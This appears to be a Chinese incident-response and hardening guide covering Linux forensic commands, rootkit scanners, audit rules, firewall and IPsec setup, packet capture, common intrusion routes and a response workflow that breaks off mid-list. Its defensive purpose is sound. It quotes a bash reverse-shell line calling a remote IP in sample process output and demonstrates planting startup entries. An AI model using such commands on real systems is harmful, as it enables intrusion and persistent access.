/etc/shadow:记录用户密码，查看是否存在可疑账号。
.bash_history:shell日志，查看之前使用过的命令。
/var/log/cron:记录计划任务。


grep evil_ip /var/log/secure*【查看last记录里的可疑ip】
grep "Accept" /var/log/secure* | awk '{print $11}' | sort | uniq【查看所有登录成功的ip】

检查常用命令是否被替换：
[root[@ceshi1](/user/ceshi1) log]# ls -alt /bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/sbin/ | head -n 10

查看.sshd里面的ip：
strings /usr/bin/.sshd | egrep '[1-9]{1,3}\.[1-9]{1,3}\.'

发现可疑进程，查看所在途径【随时准备拷贝自用的bin文件，比如ps】：
netstat -antlp
ps axu | grep xxx| grep -v grep

pstree -p【感觉完全没有win下叼啊】

查看一些临时目录

例如要查找24小时内被修改的JSP文件：
find ./ -mtime 0 -name "*.jsp"

find ./ -mtime 2
搜索是的48~72小时内修改的文件。

find . –mtime +n:
最后一次修改发生在n+1天以前，距离当前时间为(n+1)*24小时或者更早

find . –mtime –n:
最后一次修改发生在n天以内，距离当前时间为n*24小时以内

查找24小时内被修改的JSP文件也可以用：
find ./ -mtime -1 -name "*.jsp"

--------------
echo $PATH 分析有无敏感可疑信息
a) strings命令在对象文件或二进制文件中查找可打印的字符串
b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'
PS：此正则不严谨，但匹配IP已够用
c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）
查看ssh相关目录有无可疑的公钥存在。
a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。
b) 目录： /etc/ssh ./.ssh/
--------------------------



查看访问控制文件权限：
setfacl与getfacl

lsattr和chattr
修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录
例子：设置/etc/resolv.conf为不可修改
[root@vincent tmp]# chattr +i /etc/resolv.conf 
[root@vincent tmp]# lsattr /etc/resolv.conf 
----i--------e- /etc/resolv.conf
[root@vincent tmp]# echo "" &gt; /etc/resolv.conf 
-bash: /etc/resolv.conf: 权限不够
lsattr
查看文件权限
[root@vincent tmp]# lsattr 1.txt 
-----a-------e- 1.txt


【获取反弹bash】
netstat -antlp | grep EST | grep bash
【检查在监听的端口】
netstat -antlp | grep LISTEN

【查找敏感目录/tmp, /var/tmp, /dev/shm】
# ls -ald xxx

默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。
之前写的关于Bash审计方式也很推荐。从Bash4.1 版本开始，Bash开始支持Rsyslog.

find ./ -mtime 0 -name "*.jsp" 【找webshell】
diff -r {生产dir} {测试dir}



启动项排查：
【总结一下，针对CentOS5系统，需要排查的点】：
1）/etc/inittab
该文件是可以运行process的，这里我们添加一行
&gt; 0:235:once:/bin/vinc
内容如下
[root@localhost ~]# cat /bin/vinc 
#!/bin/bash
cat /etc/issue &gt; /tmp/version
重启
[root@localhost ~]# cat /tmp/version 
CentOS release 5.5 (Final)
Kernel \r on an \m
2）/etc/rc.d/rc.sysinit
在最后插入一行/bin/vinc
[root@localhost ~]# ll /tmp/version 
-rw-r--r-- 1 root root 47 11-05 10:10 /tmp/version
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local
【总结一下，针对CentOS6系统，需要排查的点】：
1）/etc/init/*.conf
vim tty.conf，添加一行
&gt; exec /bin/vinc
内容如下:
[root@vincenthostname init]# cat /bin/vinc 
#!/bin/bash

touch /tmp/vinc
重启
[root@vincenthostname ~]# ll /tmp/vinc
-rw-r--r-- 1 root root 0 6月  22 15:07 /tmp/vinc
2）/etc/rc.d/rc.sysinit
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local

定时部分：
应急响应中关于定时任务应该排查的/etc/crontab,/etc/cron.d,/var/spool/cron/{user},然后顺藤摸瓜去看其他调用的目录/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly，/etc/anacrontab 。
其中容易忽视的就是/etc/anacrontab

这里就需要介绍一些/usr/sbin/anacron，anacron是干什么的？
anacron主要在处理非 24 小时一直启动的 Linux 系统的 crontab 的运行。

ll /var/spool/cron/*
------------

检查命令替换部分：
1）系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查。
例如我替换一下/bin/ps，然后使用rpm -qaV查看
[root@vincenthostname tmp]# rpm -qa /bin/ps
2）比对命令的大小
例如正常的ps和netstat大小
[root@vincent tmp]# ll /bin/ps
-rwxr-xr-x 1 root root 87112 11月 15 2012 /bin/ps
[root@vincent tmp]# ll /bin/netstat
-rwxr-xr-x 1 root root 128216 5月 10 2012 /bin/netstat
下面是其中有一次应急时的记录
[root@DataNode110 admin]# ls -alt /bin/ | head -n 10
total 10836
-rwxr-xr-x 1 root root 625633 Aug 17 16:26 tawlqkazpu
dr-xr-xr-x. 2 root root 4096 Aug 17 16:26 .
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 ps
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 netstat
可以看到ps和netstat是一样大的。
3）查看命令的修改时间，按修改时间排序
ls -alt /bin/ | head -n 5
4）使用chkrootkit和rkhunter查看
chkrootkit
1、准备gcc编译环境
对于CentOS系统，执行下述三条命令：
&gt; yum -y install gcc gcc-c++ make glibc*
2、下载chkrootkit源码
chkrootkit的官方网站为 http://www.chkrootkit.org ，下述下载地址为官方地址。为了安全起见，务必在官方下载此程序：
&gt; [root@www ~]# wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
3、解压下载回来的安装包
&gt; [root@www ~]# tar zxf chkrootkit.tar.gz
4、编译安装（后文命令中出现的"*"无需替换成具体字符，原样复制执行即可）
&gt;[root@www ~]# cd chkrootkit-*
&gt;
&gt;[root@www ~]# make sense
注意，上面的编译命令为make sense。
5、把编译好的文件部署到/usr/local/目录中，并删除遗留的文件
&gt;[root@www ~]# cd ..
&gt;[root@www ~]# cp -r chkrootkit- /usr/local/chkrootkit
&gt;[root@www ~]# rm -r chkrootkit-
至此，安装完毕。
使用方法
安装好的chkrootkit程序位于 /usr/local/chkrootkit/chkrootkit
直接执行
&gt; root@vm:~# /usr/local/chkrootkit/chkrootkit
rkhunter
在安装了kbeast的系统上测试，发现检测效果不如rkhunter好。
下载地址： http://sourceforge.net/projects/rkhunter/files/
1）安装
tar -xvf rkhunter-1.4.0.tar.gz
cd rkhunter-1.4.0
./installer.sh –install
在安装了kbeast的系统上测试，可以成功检测到。
/usr/local/bin/rkhunter –check -sk
[19:50:27] Rootkit checks…
[19:50:27] Rootkits checked : 389
[19:50:27] Possible rootkits: 1
[19:50:27] Rootkit names : KBeast Rootkit
2）在线升级
rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:
执行命令：
&gt; rkhunter –update
3）检测最新版本
让 rkhunter 保持在最新的版本；
执行命令：
&gt; rkhunter –versioncheck


【创建Audit审计规则】
vim /etc/audit/audit.rules
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell

【编写测试Java命令监控规则，Jboss的启动账户为nobody，添加审计规则】
# grep '\-a' /etc/audit/audit.rules 
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b32 -F uid=99 -S execve -k webshell
【重启服务】
# service auditd restart
Stopping auditd: [ OK ]
Starting auditd: [ OK ]

查看恶意ip试图登录次数：
lastb | awk '{ print $3}'  | sort | uniq -c | sort -n

SSH部分：
【查看登录成功信息】
grep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者last命令，它会读取位于/var/log/wtmp的文件

【查看登录失败信息】
grep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者lastb命令，会读取位于/var/log/btmp的文件

【查看ssh配置文件和/usr/sbin/sshd的时间】
stat /usr/sbin/sshd

【通过strace监控sshd进程读写（密码）文件的操作】
# ps axu | grep sshd | grep -v grep
root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd
# strace -o aa -ff -p 65530
# grep open aa* | grep -v -e No -e null -e denied| grep WR
aa.102586:open("/tmp/ilog", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4

进程部分：
【资源占用】
top
【启动时间】
可疑与前面找到的Webshell时间点比对。
【启动权限】
这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：
mysql 63763 45.3 0.0 12284 9616 ? R 01:18 470:54 ./db_temp/dazui.4
mysql 63765 0.0 0.0 12284 9616 ? S 01:18 0:01 ./db_temp/dazui.4
mysql 63766 0.0 0.0 12284 9616 ? S 01:18 0:37 ./db_temp/dazui.4
mysql 64100 45.2 0.0 12284 9616 ? R 01:20 469:07 ./db_temp/dazui.4
mysql 64101 0.0 0.0 12284 9616 ? S 01:20 0:01 ./db_temp/dazui.4
那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。
【父进程】
例如我在菜刀中反弹Bash
[root@server120 html]# ps -ef | grep '/dev/tcp' | grep -v grep
apache 26641 1014 0 14:59 ? 00:00:00 sh -c /bin/sh -c "cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &gt;&amp; /dev/tcp/192.168.192.144/2345 0&gt;&amp;1;echo [S];pwd;echo [E]" 2&gt;&amp;1
父进程进程号1014
[root@server120 html]# ps -ef | grep 1014
apache 1014 1011 0 Sep19 ? 00:00:00 /usr/sbin/httpd
可以看到父进程为apache，就可以判断攻击者通过Web入侵。
获取到可疑进程号之后，可疑使用lsof -p pid查看相关文件和路径。
例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称
udp 0 0 0.0.0.0:49937 0.0.0.0:* 131683/ls -la 
udp 0 0 0.0.0.0:47584 0.0.0.0:* 116515/ifconfig
使用lsof -p pid可以看到可执行文件
[root@DataNode105 admin]# lsof -p 131683
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
hahidjqzx 131683 root cwd DIR 8,98 4096 18087937 /root
hahidjqzx 131683 root rtd DIR 8,98 4096 2 /
hahidjqzx 131683 root txt REG 8,98 625622 24123895 /usr/bin/hahidjqzxs
【获取文件类型】
可以文件类型可以使用file获取；


awk '{print $1}' access.log |sort|uniq -c|sort -nr|head -10【获取频率前10的ip】
netstat -nat | grep "192.168.1.15:1234" |awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -20【查看连接某服务端口最多的的IP地址】


</code></pre>
</div>

<h4 id="安全加固">安全加固</h4>

<h5 id="常规应急处理">常规应急处理</h5>

<p>杀死进程，kill -9 xxx
删除木马，拷贝正常命令【或者找原来的备份】，删除开机启动项。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
rm: cannot remove `abcfg': Operation not permitted
[root[@ceshi1](/user/ceshi1) tomcat]# lsattr abcfg
----i--------e- abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# chattr -i abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
--------------------
</code></pre>
</div>

<p>屏蔽IP</p>

<div class="highlighter-rouge"><pre class="highlight"><code>iptables -A INPUT -i eth0 -s *.*.*.0/24 -j DROP
</code></pre>
</div>

<h5 id="windows系统篇">WINDOWS系统篇</h5>

<div class="highlighter-rouge"><pre class="highlight"><code>1.1.1 禁用/停止服务
C:&gt; sc query
C:&gt; sc config "服务名" start= disabled
C:&gt; sc stop "服务名"
C:&gt; wmic service where name="服务名" call ChangeStartmode Disabled
1.1.2 防火墙管理
列出所有规则:
C:&gt; netsh advfirewall firewall show rule name=all
启用或禁用防火墙:
C:&gt; netsh advfirewall set currentprofile state on
C:&gt; netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound
C:&gt; netsh advfirewall set publicprofile state on
C:&gt; netsh advfirewall set privateprofile state on
C:&gt; netsh advfirewall set domainprofile state on
C:&gt; netsh advfirewall set allprofile state on
C:&gt; netsh advfirewall set allprof ile state off
配置举例：
netsh advfirewall firewall add rule name="开放TCP:80端口" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="开放TCP:443端口" dir=in action=allow protocol=TCP localport=443
netsh advfirewall firewall add rule name="屏蔽TCP:445端口" dir=in action=block protocol=TCP localport=445
netsh advfirewall firewall add rule name="允许MyApp" dir=in action=allow program="C:MyAppMyApp.exe" enable=yes
1.1.3 清除DNS缓存和Netios缓存
C:&gt; ipconfig /flushdns
C:&gt; nbtstat -R
1.1.4 应用控制
AppLocker配置
导入Applocker模块
PS C:&gt; import-module Applocker
查看system32目录下所有exe文件的Applocker信息
PS C:&gt; Get-ApplockerFileinformation -Directory C:WindowsSystem32 -Recurse -FileType Exe
 增加一条针对system32目录下所有的exe文件的允许规则
PS C:&gt; Get-Childitem C:WindowsSystem32*,exe | Get-ApplockerFileinformation | New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32
1.1.5 IPSEC
1.）使用预共享密钥的方式新建一条IPSEC本地安全策略，应用到所有连接和协议
C:&gt; netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY
C:&gt; netsh ipsec static add filteraction name=MyIPsecAction action=negotiate 
C:&gt; netsh ipsec static add policy name=MyIPsecPolicy assign=yes
C:&gt; netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all  activate=yes psk=密码
2.）新建一条允许访问外网TCP 80和443端口的IPSEC策略
C:&gt; netsh ipsec static add filteraction name=Allow action=permit
C:&gt; netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80
C:&gt; netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443
C:&gt; netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=密码
3.）查看和禁用某条IPSEC本地安全策略
C:&gt; netsh ipsec static show policy name=MyIPsecPolicy
C:&gt; netsh ipsec static set policy name=MyIPsecPolicy assign=no
新建一条IPSEC对应的防火墙规则，源地址和目的地址为any
C:&gt; netsh advfirewall consec add rule name="IPSEC" endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default
新建一条IPSEC对应的防火墙规则，所有出站请求必须提供预共享密钥
C:&gt; netsh advfirewall firewall add rule name="IPSEC_Out" dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any  interfacetype=any security=authenticate
1.1.6 其他安全策略
禁用远程桌面连接
C:&gt; reg add "HKLMSYSTEMCurrentControlSetControlTerminalServer" /f /v fDenyTSConnections /t REG_DWORD /d 1
只发送NTLMv2响应（防止"永恒之蓝"漏洞攻击）
C:&gt; reg add HKLMSYSTEMCurrentControlSetControlLsa /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
禁用IPV6
C:&gt; reg add HKLMSYSTEMCurrentControlSetservicesTCPIP6Parameters /v DisabledComponents /t REG_DWORD /d 255 /f
禁用sticky键
C:&gt; reg add "HKCUControlPanelAccessibilityStickyKeys" /v Flags /t REG_SZ /d 506 /f
禁用管理共享（Servers/Workstations）
C:&gt; reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareServer /t REG_DWORD /d 0
C:&gt; reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareWks /t REG_DWORD /d 0
禁用注册表编辑器和CMD命令提示符
C:&gt; reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegistryTools /t REG_DWORD /d 1 /f
C:&gt; reg add HKCUSoftwarePoliciesMicrosoftWindowsSystem /v DisableCMD /t REG_DWORD /d 1 /f
启用UAC
C:&gt; reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem /v EnableLUA /t REG_DWORD /d 1 /f
启用防火墙日志
C:&gt; netsh firewall set logging droppedpackets = enable 
C:&gt; netsh firewall set logging connections = enable
</code></pre>
</div>

<h5 id="linux系统篇">LINUX系统篇</h5>

<div class="highlighter-rouge"><pre class="highlight"><code>1.2.1 服务管理
查看服务状态
service --status-all
ps -ef OR ps -aux
initctl list
systemctl list-unit-files
启动，停止和禁用服务
For Upstart services:
/etc/init.d/apache2 start | stop | status
service apache2 start | stop | status
update-rc.d apache2 disable
For Systemd services:
systemctl start | stop | status ntp.service
systemctl disable sshd.service
1.2.2 防火墙管理
iptables 常用操作：
iptables-save &gt; filewall_rules.bak # 导出当前规则
iptables -vnL --line # 列出所有规则
iptables -S # 同上
iptables -P INPUT DROP # 默认策略，禁止所有连接
iptables -A INPUT -s 10.10.10.10 -j DROP # 禁止单个IP
iptables -A INPUT -s 10,10.10.0/24 -j DROP # 禁止一个网段
iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP # 禁止某IP访问本机SSH服务
iptables -A INPUT -p tcp --dport ssh -j DROP # 禁止访问本机SSH服务
iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix "
iptables denied: " --log-level 7 # 启用日志
iptables -F # 清除所有已加载的工作
1.2.3 DNS缓存
Unix/Linux系统没有系统级别DNS缓存
1.2.4 配置IPSEC
在两台服务器之间建立IPSEC通道
1.）添加防火墙规则允许IPSEC协议
iptables -A INPUT -p esp -j ACCEPT
iptables -A INPUT -p ah -j ACCEPT
iptables -A INPUT -p udp --dport 500 -j ACCEPT
iptables -A INPUT -p udp --dport 4500 -j ACCEPT
安装Racoon
apt -y install racoon
2.）编辑配置文件：/etc/ipsec-tools.conf
flush;
spdflush;
spdadd 主机A的IP地址 主机B的IP地址 any -P out ipsec
 esp/transport//require;
spdadd 主机B的IP地址 主机A的IP地址 any -P in ipsec
 esp/transport//require;
3.）编辑配置文件：/etc/racoon/racoon.conf
log notify;
path pre_shared_key "/etc/racoon/psk.txt";
path certificate "/etc/racoon/certs";
remote anonymous {
 exchange_mode main,aggressive;proposal {    encryption_algorithm aes_256;    hash_algorithm sha256;    authentication_method
pre_shared_key;
     dh_group modp1024;
}
 generate_policy off;
}
sainfo anonymous{
 pfs_group 2;encryption_algorithm aes_256;authentication_algorithm hmac_sha256;compression_algorithm deflate;
}   
4.）添加预共享密钥
主机A：echo 主机B 123 &gt;&gt; /etc/racoon/psk.txt
主机B：echo 主机A 123 &gt;&gt; /etc/racoon/psk.txt
5.）重启服务，检查协商及配置策略
service setkey restart
setkey -D
setkey -DP
</code></pre>
</div>

<h4 id="给目录和容器改权限">给目录和容器改权限</h4>

<p><a href="https://www.cnblogs.com/yuanqiao/p/4816843.html">apache禁止访问文件或目录执行权限、禁止运行脚本PHP文件的设置方法</a></p>

<p><a href="https://blog.csdn.net/anxinliu2011/article/details/">Tomcat用户权限设置</a></p>

<p>在ubuntu 安装完apache 之后，默认会往系统中增加www-data 用户 和 www-data 用户组。
同样你可以用 ps -ef | grep apache 查看 apache 进程，你会发现apache的。</p>

<p>这样你就可以理解为这个apache服务器运行的用户和用户组是www-data,假设网站的用户为demo,项目的目录为/var/www/html/demo</p>

<p>接下来就分几个步骤来设置(用root用户执行下面的命令)：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>1.首先把网站的的目录和文件的所有者设置为demo,所属组设置为www-data ，对与Linux命令不熟悉的，可以到网上查询。

chown -R demo:www-data /var/www/html/demo
2.设置网站目录权限为750，750是demo这个用户对目录拥有读写执行的权限，这样demo用户可以在任何目录下创建文件，用户组有有读执行权限，这样就有进入目录的权限，其它用户没有任何权限。

chmod 750 /var/www/html/demo
cd  /var/www/html/demo
find -type d -exec chmod 750 {} \;
3.设置网站文件权限为640，640指只有demo用户对网站文件有更改的权限，apache服务器只有读取文件的权限，无法更改文件，其它用户无任何权限。

find -not -type d -exec chmod 640 {} \;
4.需要针对个别目录来设置权限，以Thinkphp为例，它的Runtime 目录存储的有日志文件，还有与数据库做ORM映射的数据库表信息，这说明apache服务器要对这些目录

有访问的权限，并且对于线面的日志文件有写入的权限，那么这样就需要对于这些特殊目录设置。

cd /var/www/html/demo
find . -name "Runtime" -type d -exec chmod -R 770 {} \;
执行上面的命令请注意 “{}”与 “\”之间是有空格的，上面的-R参数是递归给Runtime 目录下面的目录和文件赋予 770 权限，当然了你会说日志文件是不需要执行权限的，

不过这里没关系，当你把日志文件删除掉之后，生成出来的文件是没执行权限的。因为当你把日志文件删除掉之后，那么生成日志文件的的用户和所有者都是www-data。

这样整个站点你就可以通过这种方式管理起来了。
</code></pre>
</div>

<h4 id="简单的抓包命令">简单的抓包命令</h4>

<p>抓取所有经过 eth2 目的或源地址是 192.168.1.2 的网络数据 ，并且保存到XX.pcap文件中</p>
<div class="highlighter-rouge"><pre class="highlight"><code>tcpdump   -i  eth2 host 192.168.1.2    -w   xx.pcap
</code></pre>
</div>

<p>抓取所有经过 eth2，目的地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中</p>
<div class="highlighter-rouge"><pre class="highlight"><code>tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
</code></pre>
</div>

<p>抓取所有经过 eth1，源地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中</p>
<div class="highlighter-rouge"><pre class="highlight"><code>tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
</code></pre>
</div>

<p>抓取网口1 源端口是25的数据，保存到xx.pcap中</p>
<div class="highlighter-rouge"><pre class="highlight"><code># tcpdump -i eth1 src port 25  -w   xx.pcap
</code></pre>
</div>

<p>抓取网口1 目的端口是25的数据，保存到xx.pcap中</p>
<div class="highlighter-rouge"><pre class="highlight"><code># tcpdump -i eth1 dst port 25  -w   xx.pcap
</code></pre>
</div>

<p>抓整个包：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#tcpdump -X -s 0 host 192.168.1.12
</code></pre>
</div>

<p>抓68字节：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#tcpdump -X host 192.168.1.12
</code></pre>
</div>
<p>对应的端口抓包：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#tcpdump -X udp port 1812
</code></pre>
</div>

<p>wireshak工具抓包：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wireshak工具抓包
tcp.port == 6789

过滤源ip、目的ip。在wireshark的过滤规则框Filter中输入过滤条件。如查找目的地址为192.168.101.8的包，ip.dst==192.168.101.8；查找源地址为ip.src==1.1.1.1；

使用wireshark常用的过滤命令
端口过滤。如过滤80端口，在Filter中输入，tcp.port==80，这条规则是把源端口和目的端口为80的都过滤出来。使用tcp.dstport==80只过滤目的端口为80的，tcp.srcport==80只过滤源端口为80的包；

使用wireshark常用的过滤命令
协议过滤比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议；

使用wireshark常用的过滤命令
http模式过滤。如过滤get包，http.request.method=="GET",过滤post包，http.request.method=="POST"；

使用wireshark常用的过滤命令
连接符and的使用。过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src==192.168.101.8 and http。
</code></pre>
</div>

<p>pcap文件过滤和合并：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>通过 editcap， 我们能以很多不同的规则来过滤 pcap 文件中的内容，并且将过滤结果保存到新文件中。

首先，以“起止时间”来过滤 pcap 文件。 " - A &lt; start-time &gt; 和 " - B &lt; end-time &gt; 选项可以过滤出在这个时间段到达的数据包（如，从 2:30 ～ 2:35）。时间的格式为 “ YYYY-MM-DD HH:MM:SS"。

$ editcap -A '2014-12-10 10:11:01'-B '2014-12-10 10:21:01' input.pcap output.pcap
也可以从某个文件中提取指定的 N 个包。下面的命令行从 input.pcap 文件中提取100个包（从 401 到 500）并将它们保存到 output.pcap 中：

$ editcap input.pcap output.pcap 401-500
使用 "-D &lt; dup-window &gt;" （dup-window可以看成是对比的窗口大小，仅与此范围内的包进行对比）选项可以提取出重复包。每个包都依次与它之前的 &lt; dup-window &gt; -1 个包对比长度与MD5值，如果有匹配的则丢弃。

$ editcap -D 10 input.pcap output.pcap
遍历了 37568 个包, 在 10 窗口内重复的包仅有一个，并丢弃。

也可以将 &lt; dup-window &gt; 定义成时间间隔。使用"-w &lt; dup-time-window &gt;"选项，对比&lt; dup-time-window &gt; 时间内到达的包。

$ editcap -w 0.5 input.pcap output.pcap
检索了 50000 个包, 以0.5s作为重复窗口，未找到重复包。

分割 pcap 文件
当需要将一个大的 pcap 文件分割成多个小文件时，editcap 也能起很大的作用。

将一个 pcap 文件分割成数据包数目相同的多个文件

$ editcap -c &lt;packets-per-file&gt;&lt;input-pcap-file&gt;&lt;output-prefix&gt;
输出的每个文件有相同的包数量，以 &lt; output-prefix &gt;-NNNN的形式命名。

以时间间隔分割 pcap 文件

$ editcap -i &lt;seconds-per-file&gt;&lt;input-pcap-file&gt;&lt;output-prefix&gt;
合并 pcap 文件
如果想要将多个文件合并成一个，用 mergecap 就很方便。

当合并多个文件时，mergecap 默认将内部的数据包以时间先后来排序。

$ mergecap -w output.pcap input.pcap input2.pcap [input3.pcap ...]
如果要忽略时间戳，仅仅想以命令行中的顺序来合并文件，那么使用 -a 选项即可。

例如，下列命令会将 input.pcap 文件的内容写入到 output.pcap, 并且将 input2.pcap 的内容追加在后面。

$ mergecap -a -w output.pcap input.pcap input2.pcap
总结
在这篇指导中，我演示了多个 editcap、 mergecap 操作 pcap 文件的例子。除此之外，还有其它的相关工具，如 reordercap用于将数据包重新排序，text2pcap 用于将 pcap 文件转换为文本格式， pcap-diff用于比较 pcap 文件的异同，等等。当进行网络入侵测试及解决网络问题时，这些工具与包注入工具非常实用，所以最好了解他们.
</code></pre>
</div>

<h3 id="入侵方式分析">入侵方式分析</h3>

<p>滚雪球式线性拓展</p>

<div class="highlighter-rouge"><pre class="highlight"><code>a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
</code></pre>
</div>

<p>常见的入侵方式Getshell方法</p>

<div class="highlighter-rouge"><pre class="highlight"><code>a) WEB入侵
</code></pre>
</div>

<p>滚雪球式线性拓展</p>

<div class="highlighter-rouge"><pre class="highlight"><code>a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
</code></pre>
</div>

<p>常见的入侵方式Getshell方法</p>

<div class="highlighter-rouge"><pre class="highlight"><code>a) WEB入侵
i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell
ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞
b) 系统入侵
i. SSH 破解后登录操作
ii. RDP 破解后登录操作
iii. MSSQL破解后远控操作
iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）
c) 典型应用

i. Mail暴力破解后信息挖掘及漏洞利用
ii. VPN暴力破解后绕过边界
iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行
iv. Rsync 未授权访问类
v. Mongodb未授权访问类
vi. Elasticsearch命令执行漏洞
vii. Memcache未授权访问漏洞
viii. 服务相关口令（mysql ldap zebra squid vnc smb）
</code></pre>
</div>

<h3 id="应急大致流程">应急大致流程</h3>

<ul>
  <li>
    <p>询问（问：1.当前情况。主要是问当前发现了哪些异常；2.服务器组件部署情况；3.是否处于内网环境？是否还有其他关联服务器？4.如果当前服务器上部署了web应用还需要问这个项目是否经过安全测试？）</p>
  </li>
  <li>
    <p>事件处理
需要依据对项目组询问的结果进行排查，心里大概列出攻击者可能通过哪几条路进来并且在心里进行排序。这块的依据是基础知识那块的第二点，能不能快速的找到问题取决于你是否了解常见的攻击套路。</p>
  </li>
  <li>
    <p>初步对事件进行判断，是否需要关停业务或者是否需要隔离被攻击主机，是否需要对被攻击主机进行断网等等，防止损失/危害进一步扩大。</p>
  </li>
  <li>
    <p>建讨论组。拉相关人员进组方便沟通交流（一般包括：项目组运维、开发、领导、我方的事件处理人员、领导）</p>
  </li>
  <li>依据上一步的排序结果进行对应日志调取，需要注意的是：日志不要在线上服务器进行分析，将线上日志打包下载回本地。不要在线上服务器进行任何多余的操作，操作的时候要小心小心再小心。可以让项目组的韵味取日志之后再发给你。对日志进行分析（考虑到我们这边项目的特征一般采用Linux下shell分析的方式，对于windows自带的事件日志一般采用splunk或者windows自带的日志分析工具或者log parser）比如通过询问了解到这台被黑的服务器用到了tomcat并且manager也存在弱口令，那么你首先需要调取的就是tomcat的日志，因为tomcat manager的入侵是需要上传war包，所以你的语句应该是：
    <div class="highlighter-rouge"><pre class="highlight"><code>cat log.log | grep -i ".war"
</code></pre>
    </div>
  </li>
  <li>
    <p>如果上一步骤中你找到了异常的war包（看文件名看上传时间）那么需要在服务器中找到这个war包下载到本地进行分析（主要分析是否是恶意的war包，如果是他的主要作用是什么）依据war包第一次上传的时间为准通过日志整理出攻击者的攻击时间线，依据时间线进行整体的入侵行为分析。分析攻击者在这个时间段内做了什么。</p>
  </li>
  <li>
    <p>如果被黑服务器处在内网还需要对内网其他服务器进行分析，是否存在被黑的情况，重点关注和被黑服务器共享同一密码的服务器。</p>
  </li>
  <li>
